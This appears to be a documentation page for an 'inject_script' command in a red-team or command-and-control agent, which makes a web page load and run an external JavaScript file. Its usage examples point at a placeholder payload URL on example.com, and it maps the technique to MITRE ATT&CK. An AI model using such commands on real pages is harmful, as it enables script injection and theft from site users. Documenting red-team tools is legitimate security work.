+++
title = "inject_script"
chapter = false
weight = 100
hidden = false
+++

## Summary

Load and execute an external JavaScript file in the current page context.
- Needs Admin: False  
- Version: 1  
- Author: @grampae  

### Arguments

#### url

- Description: URL of the external JavaScript file to load and execute
- Required Value: True  
- Default Value: None  

## Usage

```
inject_script https://example.com/payload.js
```

```
inject_script {"url":"https://example.com/payload.js"}
```

## MITRE ATT&CK Mapping

- T1059.007  

## Detailed Summary

Appends a script tag to the page and waits for it to load. Returns a success or failure message depending on whether the script is retrieved.
